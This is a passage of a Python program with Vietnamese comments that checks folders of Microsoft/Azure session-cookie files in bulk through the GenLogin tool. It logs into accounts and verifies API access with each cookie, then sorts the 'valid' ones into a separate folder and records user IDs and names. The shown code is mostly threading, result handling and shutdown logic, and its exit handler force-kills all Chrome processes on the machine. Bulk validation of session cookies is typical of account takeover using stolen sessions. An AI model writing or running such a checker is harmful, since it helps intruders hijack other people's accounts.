            if current_value < current_optimal:
                # Cần tăng số lượng worker
                for _ in range(current_optimal - current_value):
                    try:
                        worker_semaphore.release()
                    except ValueError:
                        # Semaphore đã đạt giá trị tối đa
                        break
            elif current_value > current_optimal:
                # Cần giảm số lượng worker
                for _ in range(current_value - current_optimal):
                    # Không block, chỉ thử acquire nếu có sẵn
                    if not worker_semaphore.acquire(blocking=False):
                        break
            
            return current_optimal
        
        def process_batch_worker(batch_idx, batch_files):
            """Hàm worker xử lý một batch"""
            # Kiểm tra cờ shutdown trước khi thực hiện acquire semaphore
            if is_shutdown_requested() or shutdown_event.is_set():
                return None
                
            with worker_semaphore:
                # Kiểm tra cờ shutdown sau khi acquire semaphore
                if is_shutdown_requested() or shutdown_event.is_set():
                    return None
                
                # Ghi nhận batch đang được xử lý
                with lock:
                    active_batches.add(batch_idx)
                    
                worker_id = batch_idx + 1
                task_id = f"batch_{batch_idx}"
                task_scheduler.record_task_start(task_id)
                
                try:
                    # Xử lý batch file
                    batch_results = self.process_batch(batch_files, worker_id)
                    
                    # Kiểm tra cờ shutdown sau khi xử lý batch
                    if is_shutdown_requested() or shutdown_event.is_set():
                        with lock:
                            if batch_idx in active_batches:
                                active_batches.remove(batch_idx)
                        self.logger.info(f"Batch {batch_idx} hoàn thành nhưng phát hiện yêu cầu shutdown")
                        task_scheduler.record_task_complete(task_id, True)
                        return None
                    
                    # Cập nhật tiến độ
                    nonlocal processed_batches
                    with lock:
                        processed_batches += 1
                        progress = processed_batches / total_batches
                        elapsed = time.time() - start_time
                        eta = (elapsed / progress - elapsed) if progress > 0 else 0
                        
                        # In tiến độ
                        print(
                            f"\n--- Tiến độ: {processed_batches}/{total_batches} batch "
                            f"({progress*100:.1f}%) - ETA: {eta/60:.1f} phút - Workers: {dynamic_rate_limiter()} ---\n"
                        )
                        
                        # Lưu kết quả
                        completed_results[batch_idx] = True
                        active_batches.remove(batch_idx)
                        
                    # Báo hoàn thành cho scheduler
                    task_scheduler.record_task_complete(task_id, True)
                    return batch_idx
                    
                except Exception as e:
                    error_msg = f"Lỗi xử lý batch {batch_idx} (Worker {worker_id}): {type(e).__name__}: {str(e)}"
                    self.logger.error(f"{error_msg}\n{traceback.format_exc()}")
                    
                    with lock:
                        completed_results[batch_idx] = False
                        if batch_idx in active_batches:
                            active_batches.remove(batch_idx)
                        
                    task_scheduler.record_task_complete(task_id, False)
                    return None
        
        try:
            # Sử dụng ThreadPoolExecutor với kích thước pool lớn nhất có thể
            # Số lượng concurrent sẽ được kiểm soát bằng semaphore
            max_possible_workers = min(32, os.cpu_count() * 5)  # Giới hạn hợp lý 
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_possible_workers) as executor:
                # Submit tất cả các batch vào executor
                futures = {executor.submit(process_batch_worker, idx, batch): idx 
                        for idx, batch in enumerate(batches)}
                
                try:
                    # Theo dõi và xử lý kết quả khi hoàn thành
                    for future in concurrent.futures.as_completed(futures):
                        # Kiểm tra cờ shutdown trước khi xử lý future 
                        if is_shutdown_requested():
                            self.logger.warning("Phát hiện yêu cầu shutdown, dừng xử lý batches tiếp theo")
                            # Hủy các future đang chờ
                            for f in futures:
                                if not f.done():
                                    f.cancel()
                            # Dừng executor
                            executor.shutdown(wait=False)
                            break
                        
                        batch_idx = futures[future]
                        try:
                            result = future.result()
                            # Không cần làm gì thêm vì đã xử lý trong worker function
                        except Exception as e:
                            self.logger.error(
                                f"Exception không xử lý trong batch {batch_idx}: {type(e).__name__}: {str(e)}"
                            )
                        
                        # Cứ 5 batch, hiển thị báo cáo hiệu suất
                        if processed_batches > 0 and processed_batches % 5 == 0:
                            # Kiểm tra cờ shutdown trước khi hiển thị metrics
                            if is_shutdown_requested():
                                break
                                
                            perf_report = task_scheduler.get_performance_report()
                            self.logger.info(
                                f"Metrics hiệu suất: {perf_report['tasks_completed']} tasks, "
                                f"avg_time={perf_report['avg_task_time']:.2f}s, workers={perf_report['current_workers']}"
                            )
                            
                            # Điều chỉnh semaphore theo giá trị optimal mới
                            dynamic_rate_limiter()
                
                except KeyboardInterrupt:
                    self.logger.warning("Phát hiện KeyboardInterrupt trong loop xử lý futures, dừng xử lý...")
                    
                    # Đặt cờ shutdown toàn cục và sự kiện shutdown cục bộ
                    request_shutdown()
                    shutdown_event.set()
                    
                    # Thông báo cho người dùng
                    print("\nPhát hiện Ctrl+C - Đang dừng các tiến trình và dọn dẹp tài nguyên...")
                    
                    # Hủy các future đang chờ
                    for f in futures:
                        if not f.done():
                            f.cancel()
                    
                    # Dừng executor ngay lập tức
                    executor.shutdown(wait=False)
                    
                    # Đợi ngắn cho việc thông báo
                    time.sleep(0.5)
                    
                    # Re-raise để main xử lý
                    raise
        
        except KeyboardInterrupt:
            # Xử lý khi người dùng dừng bằng Ctrl+C
            self.logger.warning("Phát hiện KeyboardInterrupt, đang dừng xử lý...")
            
            # Đặt cờ shutdown và sự kiện
            request_shutdown()
            shutdown_event.set()
            
            # Thông báo cho người dùng
            print("\nĐang dừng xử lý và đóng tài nguyên...")
            
            # In thông tin về các batch đang xử lý
            with lock:
                if active_batches:
                    active_batch_list = sorted(list(active_batches))
                    self.logger.info(f"Đang hủy {len(active_batches)} batch đang xử lý: {active_batch_list}")
            
            # Dừng ngay, không re-raise vì đã ra khỏi context manager của executor
        
        except Exception as e:
            # Xử lý các ngoại lệ khác
            self.logger.error(f"Lỗi không mong đợi khi xử lý batches: {type(e).__name__}: {str(e)}")
            traceback.print_exc()
            
            # Đặt cờ shutdown
            request_shutdown()
            shutdown_event.set()
        
        finally:
            # Kiểm tra và đóng các tài nguyên còn đang sử dụng
            try:
                # Hiển thị thông tin các batch đang xử lý nếu có
                with lock:
                    if active_batches and not is_shutdown_requested():
                        self.logger.info(f"Đang đợi {len(active_batches)} batch đang xử lý hoàn thành...")
            except:
                pass
            
            # Ghi nhận thống kê cuối cùng
            try:
                self.session_stats["end_time"] = datetime.now()
                total_time = (self.session_stats["end_time"] - self.session_stats["start_time"]).total_seconds()
                success_count = sum(1 for success in completed_results.values() if success)
                
                # Thêm thông tin về shutdown nếu có
                shutdown_msg = " (bị dừng do yêu cầu shutdown)" if is_shutdown_requested() else ""
                
                self.logger.info(
                    f"Hoàn tất kiểm tra {processed_batches}/{total_batches} batch "
                    f"({success_count} thành công){shutdown_msg} trong {total_time:.1f} giây"
                )
            except Exception as e:
                self.logger.error(f"Lỗi khi ghi nhận thống kê: {str(e)}")

# --- ResultManager ---
class ResultManager:
    """
    Quản lý kết quả với tối ưu bộ nhớ:
    - Lưu kết quả trung gian ra đĩa để giảm sử dụng RAM
    - Xử lý theo batch để kiểm soát bộ nhớ
    - Tạo báo cáo kết quả chi tiết
    - Phân tích thống kê để cải thiện hiệu suất
    """
    def __init__(
        self,
        output_dir: Path,
        max_results_in_memory: int = 500,
        logger: Optional[logging.Logger] = None
    ):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True, parents=True)
        self.logger = logger or logging.getLogger(__name__)
        self.results = {}  # {filename: result_dict}
        self.results_count = 0
        self.max_results_in_memory = max_results_in_memory
        self.valid_count = 0
        self.invalid_count = 0
        self.error_count = 0
        self.batch_files = []  # List of batch file paths
        self.result_lock = threading.RLock()
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.valid_cookies_dir = self.output_dir / f"valid_cookies_{self.timestamp}"
        
        # Added metrics
        self.start_time = datetime.now()
        self.processing_stats = {
            "total_processing_time": 0,
            "avg_processing_time": 0,
            "error_types": defaultdict(int),
            "validation_methods": defaultdict(int)
        }

    def add_result(self, filename: str, result: Dict) -> None:
        """
        Thêm kết quả kiểm tra vào quản lý kết quả.
        Tự động lưu batch khi đạt ngưỡng bộ nhớ.
        
        Cookie chỉ được coi là hợp lệ khi final_validation = True
        (tức là đã đạt cả login_success và api_success)
        """
        with self.result_lock:
            self.results[filename] = result
            self.results_count += 1
            
            # Lấy các thông tin chi tiết để phân loại kết quả
            details = result.get('details', {})
            has_login_success = details.get('login_status', False)
            has_api_success = details.get('api_check_status', False)
            has_api_check = details.get('api_check_performed', False)
            has_final_validation = details.get('final_validation', False)
            
            # Cập nhật thống kê dựa trên final_validation
            if result.get('valid', False) and has_final_validation:
                # Cookie hợp lệ - phải có cả đăng nhập và API thành công
                self.valid_count += 1
                
                # Ghi nhận phương thức xác thực
                if 'login_method' in details:
                    method = details['login_method']
                    self.processing_stats["validation_methods"][method] = self.processing_stats["validation_methods"].get(method, 0) + 1
                
                # Ghi nhận thông tin người dùng (có thể sử dụng để phân tích sau này)
                if 'user_id' in details and 'display_name' in details:
                    user_info = f"{details.get('display_name')} ({details.get('user_id')[:8]}...)"
                    self.logger.debug(f"Cookie hợp lệ: {filename} - {user_info}")
            
            elif 'error' in result:
                # Lỗi xảy ra
                self.error_count += 1
                error_type = "unknown"
                if "error" in result:
                    # Trích xuất loại lỗi (tên class exception)
                    error_msg = result["error"]
                    match = re.search(r'\w+Error', error_msg)
                    if match:
                        error_type = match.group(0)
                    else:
                        # Nếu không tìm thấy pattern Error, lấy 30 ký tự đầu
                        error_type = error_msg[:30] if error_msg else "unknown"
                        
                self.processing_stats["error_types"][error_type] = self.processing_stats["error_types"].get(error_type, 0) + 1
                
                # Phân tích thêm về lỗi để ghi nhận chính xác
                if 'error_phase' in details:
                    error_phase = details['error_phase']
                    phase_key = f"phase_{error_phase}"
                    self.processing_stats[phase_key] = self.processing_stats.get(phase_key, 0) + 1
            
            else:
                # Cookie không hợp lệ do không đạt yêu cầu (không có lỗi exception)
                self.invalid_count += 1
                
                # Phân loại rõ ràng lý do không hợp lệ
                if has_login_success and has_api_check and not has_api_success:
                    # Đăng nhập OK nhưng API thất bại
                    reason = "api_verification_failed"
                    self.processing_stats["api_failures"] = self.processing_stats.get("api_failures", 0) + 1
                elif not has_login_success:
                    # Đăng nhập thất bại
                    reason = "login_failed"
                    self.processing_stats["login_failures"] = self.processing_stats.get("login_failures", 0) + 1
                else:
                    # Lý do khác
                    reason = "other_validation_failed"
                    
                # Ghi nhận lý do không hợp lệ
                self.processing_stats.setdefault("invalid_reasons", {})
                self.processing_stats["invalid_reasons"][reason] = self.processing_stats["invalid_reasons"].get(reason, 0) + 1
            
            # Thêm thống kê về xác thực API để phân tích
            if has_api_check:
                if has_api_success:
                    self.processing_stats["api_success_count"] = self.processing_stats.get("api_success_count", 0) + 1
                else:
                    self.processing_stats["api_failed_count"] = self.processing_stats.get("api_failed_count", 0) + 1
            
            # Nếu vượt quá ngưỡng bộ nhớ, lưu batch
            if len(self.results) >= self.max_results_in_memory:
                self._save_results_batch()

    def _save_results_batch(self) -> None:
        """Lưu batch kết quả xuống đĩa để giảm sử dụng bộ nhớ."""
        if not self.results:
            return
        try:
            batch_timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            batch_file = self.output_dir / f"results_batch_{batch_timestamp}.json"
            
            # Lưu batch với một số thông tin bổ sung
            batch_data = {
                'timestamp': batch_timestamp,
                'batch_stats': {
                    'valid_count': sum(1 for r in self.results.values() if r.get('valid', False)),
                    'invalid_count': sum(1 for r in self.results.values() if not r.get('valid', False) and 'error' not in r),
                    'error_count': sum(1 for r in self.results.values() if 'error' in r),
                },
                'results': self.results
            }
            
            with open(batch_file, 'w', encoding='utf-8') as f:
                json.dump(batch_data, f, ensure_ascii=False, indent=2)
            
            self.batch_files.append(batch_file)
            self.logger.debug(f"Đã lưu {len(self.results)} kết quả vào batch: {batch_file}")
            self.results = {}
        except Exception as e:
            self.logger.error(f"Lỗi lưu batch: {type(e).__name__}: {str(e)}")

    def move_valid_cookie(self, file_path: Path, is_valid: bool, result_details: Optional[Dict] = None) -> Optional[Path]:
        """
        Di chuyển file cookie hợp lệ vào thư mục riêng.
        Cookie chỉ được coi là hợp lệ khi final_validation = True (login_success AND api_success).
        
        Args:
            file_path: Đường dẫn file cookie
            is_valid: Cờ xác định file cookie có hợp lệ không (theo phía người gọi)
            result_details: Chi tiết kết quả kiểm tra (tùy chọn)
        
        Returns:
            Optional[Path]: Đường dẫn mới nếu di chuyển thành công, None nếu thất bại
        """
        # Kiểm tra điều kiện đầu vào
        if not file_path.exists():
            self.logger.warning(f"File không tồn tại: {file_path}")
            return None
        
        # Kiểm tra sự hợp lệ dựa trên final_validation
        final_validation = False
        if result_details:
            final_validation = result_details.get("final_validation", False)
            
        cookie_valid = is_valid and final_validation

        if not cookie_valid:
            if is_valid and result_details and not final_validation:
                # Trường hợp đặc biệt: is_valid=True nhưng final_validation=False
                self.logger.warning(
                    f"Cookie {file_path.name} không được di chuyển: Đánh dấu hợp lệ nhưng final_validation=False"
                )
                # Kiểm tra nguyên nhân
                if result_details.get("login_status", False) and not result_details.get("api_check_status", False):
                    self.logger.info(f"Nguyên nhân: Đăng nhập thành công nhưng API thất bại")
            return None
                
        with self.result_lock:
            try:
                # Tạo thư mục nếu chưa tồn tại
                self.valid_cookies_dir.mkdir(exist_ok=True, parents=True)
                
                # Chuẩn bị tên file đích
                dest_path = self.valid_cookies_dir / file_path.name
                
                # Xử lý trùng tên file
                if dest_path.exists():
                    counter = 1
                    while dest_path.exists():
                        new_name = f"{file_path.stem}_{counter}{file_path.suffix}"
                        dest_path = self.valid_cookies_dir / new_name
                        counter += 1
                
                # Trích xuất thông tin người dùng từ result_details nếu có
                user_info = ""
                if result_details:
                    user_id = result_details.get("user_id", "")
                    display_name = result_details.get("display_name", "")
                    domain_name = result_details.get("domain_name", "")
                    
                    if display_name and domain_name:
                        user_info = f" ({display_name}@{domain_name})"
                    elif display_name:
                        user_info = f" ({display_name})"
                
                # Thử sao chép file trước
                success = False
                try:
                    # Sử dụng copy2 để giữ nguyên metadata
                    shutil.copy2(str(file_path), str(dest_path))
                    self.logger.info(f"Đã sao chép cookie hợp lệ {file_path.name}{user_info} vào {self.valid_cookies_dir}")
                    print(f"✓ File {file_path.name} => Hợp lệ{user_info} -> Đã sao chép vào {self.valid_cookies_dir}")
                    
                    # Nếu sao chép thành công, thử xóa file gốc
                    try:
                        os.remove(str(file_path))
                        self.logger.debug(f"Đã xóa file gốc {file_path.name} sau khi sao chép")
                    except (PermissionError, OSError) as e:
                        self.logger.warning(f"Không thể xóa file gốc {file_path.name}: {str(e)}")
                    
                    success = True
                except Exception as e:
                    self.logger.warning(f"Sao chép thất bại ({str(e)}), thử di chuyển file...")
                
                # Nếu sao chép thất bại, thử di chuyển
                if not success:
                    try:
                        # Đảm bảo file nguồn tồn tại và có thể đọc
                        if not file_path.exists() or not os.access(str(file_path), os.R_OK):
                            raise FileNotFoundError(f"File {file_path} không tồn tại hoặc không thể đọc")
                            
                        # Đảm bảo thư mục đích tồn tại và có thể ghi
                        if not os.access(str(dest_path.parent), os.W_OK):
                            raise PermissionError(f"Không có quyền ghi vào thư mục {dest_path.parent}")
                        
                        # Sử dụng os.rename thay vì shutil.move để hiệu quả hơn trong cùng ổ đĩa
                        try:
                            os.rename(str(file_path), str(dest_path))
                        except OSError:
                            # Fallback to shutil.move nếu os.rename thất bại (khác ổ đĩa)
                            shutil.move(str(file_path), str(dest_path))
                            
                        self.logger.info(f"Đã di chuyển cookie hợp lệ {file_path.name}{user_info} vào {self.valid_cookies_dir}")
                        print(f"✓ File {file_path.name} => Hợp lệ{user_info} -> Đã di chuyển vào {self.valid_cookies_dir}")
                        success = True
                    except Exception as e:
                        err_msg = f"Lỗi di chuyển file {file_path.name}: {type(e).__name__}: {str(e)}"
                        self.logger.error(err_msg)
                        print(f"⚠️ {err_msg}")
                        return None
                
                # Thêm thông tin chi tiết vào log
                if success and result_details:
                    login_method = result_details.get("login_method", "unknown")
                    data_source = result_details.get("data_source", "unknown")
                    self.logger.debug(
                        f"Chi tiết cookie hợp lệ: file={file_path.name}, login_method={login_method}, "
                        f"data_source={data_source}, user_id={result_details.get('user_id', 'unknown')}"
                    )
                
                return dest_path if success else None
                    
            except Exception as e:
                err_msg = f"Lỗi xử lý file {file_path.name}: {type(e).__name__}: {str(e)}"
                self.logger.error(err_msg)
                print(f"⚠️ {err_msg}")
                # Không raise exception để không làm gián đoạn quá trình
                return None

    def get_summary(self) -> Dict:
        """
        Lấy tóm tắt kết quả kiểm tra.
        Bao gồm thống kê chi tiết về kết quả xác minh dựa trên
        logic final_validation = login_success AND api_success
        """
        with self.result_lock:
            elapsed_time = (datetime.now() - self.start_time).total_seconds()
            processed_per_second = self.results_count / elapsed_time if elapsed_time > 0 else 0
            
            # Tính toán chi tiết các thống kê API
            api_success_count = self.processing_stats.get("api_success_count", 0)
            api_failed_count = self.processing_stats.get("api_failed_count", 0)
            api_total = api_success_count + api_failed_count
            api_success_rate = (api_success_count / api_total * 100) if api_total > 0 else 0
            
            # Tính toán tỷ lệ từng loại kết quả
            valid_percentage = (self.valid_count / self.results_count * 100) if self.results_count else 0
            invalid_percentage = (self.invalid_count / self.results_count * 100) if self.results_count else 0
            error_percentage = (self.error_count / self.results_count * 100) if self.results_count else 0
            
            # Phân tích lý do không hợp lệ
            invalid_reasons = self.processing_stats.get("invalid_reasons", {})
            api_failures = self.processing_stats.get("api_failures", 0)
            login_failures = self.processing_stats.get("login_failures", 0)
            
            # Tính toán lý do không hợp lệ chính
            primary_invalid_reason = "unknown"
            if invalid_reasons:
                primary_invalid_reason = max(invalid_reasons.items(), key=lambda x: x[1])[0]
            
            # Tạo danh sách top lỗi
            top_errors = {}
            if "error_types" in self.processing_stats:
                top_errors = dict(sorted(
                    self.processing_stats["error_types"].items(), 
                    key=lambda x: x[1], 
                    reverse=True
                )[:5])
            
            return {
                # Thông tin cơ bản
                'timestamp': self.timestamp,
                'total_processed': self.results_count,
                'valid_count': self.valid_count,
                'invalid_count': self.invalid_count,
                'error_count': self.error_count,
                
                # Tỷ lệ phần trăm
                'valid_percentage': valid_percentage,
                'invalid_percentage': invalid_percentage,
                'error_percentage': error_percentage,
                
                # Thông tin logic xác minh
                'verification_logic': "login_success AND api_success",
                'validation_methods': dict(self.processing_stats.get("validation_methods", {})),
                
                # Thống kê API
                'api_stats': {
                    'total_checked': api_total,
                    'success_count': api_success_count,
                    'failed_count': api_failed_count,
                    'success_rate': api_success_rate
                },
                
                # Phân tích kết quả không hợp lệ
                'invalid_analysis': {
                    'api_failures': api_failures,
                    'login_failures': login_failures,
                    'primary_reason': primary_invalid_reason,
                    'detailed_reasons': invalid_reasons
                },
                
                # Phân tích lỗi
                'error_analysis': {
                    'top_errors': top_errors,
                    'error_phases': {k.replace('phase_', ''): v for k, v in self.processing_stats.items() 
                                    if k.startswith('phase_')}
                },
                
                # Thông tin hiệu suất
                'performance': {
                    'elapsed_time': elapsed_time,
                    'processed_per_second': processed_per_second,
                    'start_time': self.start_time.isoformat(),
                    'end_time': datetime.now().isoformat()
                },
                
                # Thông tin đầu ra
                'output': {
                    'valid_cookies_dir': str(self.valid_cookies_dir) if self.valid_count > 0 else None,
                    'batch_files': len(self.batch_files)
                }
            }

    def print_summary(self) -> None:
        """In tóm tắt kết quả ra console."""
        summary = self.get_summary()
        print("\n=== KẾT QUẢ KIỂM TRA COOKIE ===")
        print(f"Tổng số file: {summary['total_processed']}")
        print(f"Logic xác minh: Đăng nhập thành công VÀ xác thực API thành công")
        
        if summary['total_processed'] > 0:
            print(f"Hợp lệ: {summary['valid_count']} ({summary['valid_percentage']:.1f}%)")
            print(f"Không hợp lệ: {summary['invalid_count']} ({summary['invalid_count']*100/summary['total_processed']:.1f}%)")
            print(f"Lỗi: {summary['error_count']} ({summary['error_count']*100/summary['total_processed']:.1f}%)")
            
            # Thêm phần hiển thị thống kê API
            if 'api_success_count' in summary and 'api_fail_count' in summary:
                api_total = summary['api_success_count'] + summary['api_fail_count']
                if api_total > 0:
                    print(f"\nThống kê API:")
                    print(f"  - Xác thực API thành công: {summary['api_success_count']} ({summary['api_success_count']*100/api_total:.1f}%)")
                    print(f"  - Xác thực API thất bại: {summary['api_fail_count']} ({summary['api_fail_count']*100/api_total:.1f}%)")
            
            print(f"\nThời gian xử lý: {summary['elapsed_time']:.2f} giây")
            print(f"Tốc độ xử lý: {summary['processed_per_second']:.2f} file/giây")
            
            # In top errors
            if summary['top_errors']:
                print("\nTop lỗi phổ biến:")
                for error, count in summary['top_errors'].items():
                    print(f"  - {error}: {count} lần")
                    
        if summary['valid_count'] > 0:
            print(f"\nCookie hợp lệ đã được lưu vào: {summary['valid_cookies_dir']}")

def setup_signal_handlers(cleanup_fn):
    """Thiết lập xử lý tín hiệu để thoát an toàn."""
    global last_interrupt_time, emergency_exit_in_progress
    
    def signal_handler(sig, frame):
        global last_interrupt_time, emergency_exit_in_progress
        current_time = time.time()
        
        # Kiểm tra xem đây có phải là Ctrl+C lần thứ hai trong khoảng thời gian ngắn
        if current_time - last_interrupt_time < 3 and not emergency_exit_in_progress:
            print("\n\nPhát hiện Ctrl+C lần thứ hai - THOÁT KHẨN CẤP!")
            emergency_exit(sig, frame)
            return
        
        last_interrupt_time = current_time
        print("\n\nĐã nhận tín hiệu dừng. Đang dọn dẹp tài nguyên...")
        
        # Đặt cờ toàn cục
        request_shutdown()
        
        # Đóng các process mà không cần đợi quá lâu
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    proc_name = proc.info['name'].lower()
                    if 'chromedriver' in proc_name or 'chrome' in proc_name:
                        proc.kill()
                except:
                    pass
        except:
            pass

        try:
            cleanup_fn()
        except Exception as e:
            print(f"Lỗi khi dọn dẹp: {str(e)}")
        
        print("Thoát chương trình.")
        sys.exit(0)
    
    def emergency_exit(sig, frame):
        global emergency_exit_in_progress
        emergency_exit_in_progress = True
        print("\n\nĐang thoát khẩn cấp...")
        
        # Đặt cờ toàn cục
        request_shutdown()
        
        # Giảm tất cả timeout xuống giá trị cực thấp
        try:
            import socket
            socket.setdefaulttimeout(0.1)  # 100ms timeout
        except:
            pass
        
        # Kill processes ngay lập tức không đợi 
        try:
            # Đóng mọi selenium driver đang chạy thông qua Command (Windows) trước
            if platform.system() == "Windows":
                os.system("taskkill /f /im chromedriver.exe >nul 2>&1")
                os.system("taskkill /f /im chrome.exe >nul 2>&1")
            
            # Rồi sau đó duyệt để kill thủ công
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    proc_name = proc.info['name'].lower()
                    if 'chromedriver' in proc_name or 'chrome' in proc_name:
                        proc.kill()
                except:
                    pass
        except:
            pass
        
        # Thoát tức thì không thực hiện thêm cleanup
        os._exit(1)

    signal.signal(signal.SIGINT, signal_handler)
    if hasattr(signal, 'SIGBREAK'):
        signal.signal(signal.SIGBREAK, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

def main():
    """
    Hàm chính của chương trình, xử lý tham số dòng lệnh và
    chạy quy trình kiểm tra cookie.
    
    Logic xác minh: Cookie chỉ hợp lệ khi final_validation = login_success AND api_success.
    """
    parser = argparse.ArgumentParser(
        description='Kiểm tra hàng loạt file cookie Azure/Microsoft qua GenLogin'
    )
    parser.add_argument('--folder', '-f', help='Thư mục chứa file cookie')
    parser.add_argument('--output', '-o', help='Thư mục lưu kết quả')
    parser.add_argument('--config', '-c', help='File cấu hình')
    parser.add_argument('--workers', '-w', type=int, help='Số worker tối đa')
    parser.add_argument('--batch-size', '-b', type=int, help='Kích thước batch')
    parser.add_argument('--debug', '-d', action='store_true', help='Chế độ debug')
    parser.add_argument('--version', '-v', action='store_true', help='Hiển thị phiên bản')
    parser.add_argument('--strict-validation', '-s', action='store_true', 
                       help='Áp dụng nghiêm ngặt xác minh login_success AND api_success', default=True)
    args = parser.parse_args()

    if args.version:
        print(f"Cookie Checker version {VERSION}")
        return

    driver_pool = None
    task_scheduler = None
    system_monitor = None
    resources_to_cleanup = []

    try:
        print(f"=== KIỂM TRA NHIỀU FILE COOKIE (Microsoft/Azure) QUA GENLOGIN ===")
        print(f"Version: {VERSION} - Tối ưu hiệu suất cao")
        print(f"Logic xác minh: Cookie chỉ hợp lệ khi cả đăng nhập VÀ API đều thành công")
        overall_start_time = time.time()

        log_path = Path("logs")
        log_path.mkdir(exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        log_file = log_path / f"checker_{timestamp}.log"
        console_level = logging.DEBUG if args.debug else logging.INFO
        logger = setup_logging(str(log_file), console_level=console_level, file_level=logging.DEBUG)
        logger.info(f"=== KHỞI ĐỘNG CHƯƠNG TRÌNH V{VERSION} ===")
        logger.info(f"Timestamp: {timestamp}")
        logger.info(f"Logic xác minh: final_validation = login_success AND api_success")

        # Thiết lập socket timeout mặc định - gọi ngay sau setup_logging
        setup_global_socket_timeout()
        logger.info("Đã thiết lập socket timeout mặc định")
        
        config_path = args.config if args.config else DEFAULT_CONFIG_PATH
        if not os.path.exists(config_path):
            logger.error(f"Không tìm thấy file cấu hình: {config_path}")
            print(f"Không tìm thấy file cấu hình: {config_path}")
            return

        config = SimpleConfig(config_path)
        logger.info(f"Đã load cấu hình từ: {config_path}")
        
        # Thêm cấu hình cho strict validation
        config.strict_validation = args.strict_validation
        logger.info(f"Xác minh nghiêm ngặt (login_success AND api_success): {config.strict_validation}")

        if args.workers:
            config.max_workers = args.workers
            logger.info(f"Ghi đè số worker từ command line: {config.max_workers}")

        if args.batch_size:
            config.batch_size = args.batch_size
            logger.info(f"Ghi đè batch size từ command line: {config.batch_size}")

        # Khởi tạo SystemMonitor để giám sát tài nguyên
        system_monitor = SystemMonitor(logger=logger)
        resources_to_cleanup.append(system_monitor)
        
        # Kiểm tra và khuyến nghị số worker dựa trên tài nguyên hệ thống
        resources = system_monitor.get_system_resources()
        cpu_count = resources["cpu_count"]
        memory_gb = resources.get("memory_total_gb", 0)
        recommended_workers = system_monitor.recommend_workers(config.max_workers)
        
        if config.max_workers > recommended_workers:
            print(f"\nCẢNH BÁO: Số worker ({config.max_workers}) có thể quá cao cho hệ thống.")
            print(f"Đề xuất: {recommended_workers} worker(s) với {cpu_count} CPU và {memory_gb:.1f}GB RAM.")
            confirm = input(f"Tiếp tục với {config.max_workers} worker? (Y/n): ").strip().lower()
            if confirm == 'n':
                config.max_workers = recommended_workers
                print(f"Đã điều chỉnh xuống {config.max_workers} worker(s).")
                logger.info(f"Điều chỉnh số worker xuống {config.max_workers} theo khuyến nghị")

        folder = args.folder if args.folder else input("Nhập đường dẫn thư mục chứa file cookie: ").strip()
        folder_path = Path(folder)
        if not folder_path.is_dir():
            print("⚠ Thư mục không hợp lệ. Thoát.")
            logger.error(f"Thư mục không hợp lệ: {folder}")
            return

        cookie_files = list(folder_path.glob("*.txt")) + list(folder_path.glob("*.json"))
        if not cookie_files:
            print("⚠ Không tìm thấy file cookie nào. Thoát.")
            logger.warning(f"Không tìm thấy file cookie nào trong {folder}")
            return

        print(f"Đã tìm thấy {len(cookie_files)} file cookie trong {folder}")
        logger.info(f"Đã tìm thấy {len(cookie_files)} file cookie trong {folder}")

        output_dir = Path(args.output) if args.output else Path("results")
        output_dir.mkdir(exist_ok=True, parents=True)

        # Khởi tạo AdaptiveTaskScheduler
        task_scheduler = AdaptiveTaskScheduler(
            max_workers=config.max_workers,
            max_cpu_percent=config.max_cpu_percent,
            max_memory_percent=config.max_memory_percent,
            logger=logger
        )
        resources_to_cleanup.append(task_scheduler)
        logger.info(f"Khởi tạo AdaptiveTaskScheduler với {config.max_workers} worker(s) tối đa")

        # Khởi tạo WebDriverPool
        driver_pool = WebDriverPool(
            config=config,
            max_size=config.driver_pool_size,
            ttl=config.get_timeout("driver_ttl", 600),
            logger=logger,
            warm_pool=True  # Khởi tạo trước một số driver
        )
        resources_to_cleanup.append(driver_pool)
        logger.info(f"Khởi tạo WebDriverPool với {config.driver_pool_size} driver(s) tối đa")

        # Khởi tạo ResultManager
        result_manager = ResultManager(
            output_dir=output_dir,
            max_results_in_memory=500,
            logger=logger
        )
        resources_to_cleanup.append(result_manager)
        logger.info(f"Khởi tạo ResultManager với output_dir={output_dir}")

        # Khởi tạo CookieProcessor
        cookie_processor = CookieProcessor(
            domain_url_map=config.domain_url_map,
            logger=logger,
            cache_size=100  # Thêm cache để tái sử dụng kết quả
        )
        logger.info(f"Khởi tạo CookieProcessor với {len(config.domain_url_map)} domain(s)")

        # Khởi tạo LoginVerifier và ApiVerifier
        login_verifier = LoginVerifier(config=config, logger=logger)
        api_verifier = ApiVerifier(config=config, logger=logger)
        
        # Khởi tạo CookieChecker
        checker = CookieChecker(
            config=config,
            driver_pool=driver_pool,
            result_manager=result_manager,
            logger_instance=logger,
            auto_save_results=True,
            cookie_processor=cookie_processor,
            login_verifier=login_verifier,
            api_verifier=api_verifier
        )
        logger.info("Khởi tạo CookieChecker thành công")

        def cleanup_resources():
            logger.info("Đang dọn dẹp tài nguyên...")
            
            # Đặt cờ shutdown trước để thông báo cho tất cả thread
            request_shutdown()
            
            # Đợi ngắn để đảm bảo tín hiệu lan truyền
            time.sleep(0.5)
            
            # Ưu tiên đóng driver pool trước
            if driver_pool:
                try:
                    logger.info("Đóng WebDriver Pool...")
                    driver_pool.shutdown()
                except Exception as e:
                    logger.error(f"Lỗi khi đóng WebDriver Pool: {str(e)}")
            
            # Đóng các tài nguyên còn lại
            for resource in [resource for resource in resources_to_cleanup if resource != driver_pool]:
                try:
                    if hasattr(resource, 'shutdown'):
                        logger.info(f"Đang dọn dẹp {resource.__class__.__name__}...")
                        resource.shutdown()
                except Exception as e:
                    logger.error(f"Lỗi khi dọn dẹp resource {resource.__class__.__name__}: {str(e)}")
            
            # Đảm bảo mọi ChromeDriver và Chrome đều bị đóng
            try:
                logger.info("Tìm và đóng tất cả các process Chrome/ChromeDriver còn sót...")
                for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                    try:
                        name = proc.info['name'].lower()
                        if 'chromedriver' in name or ('chrome' in name and any('remote-debugging-port' in cmd 
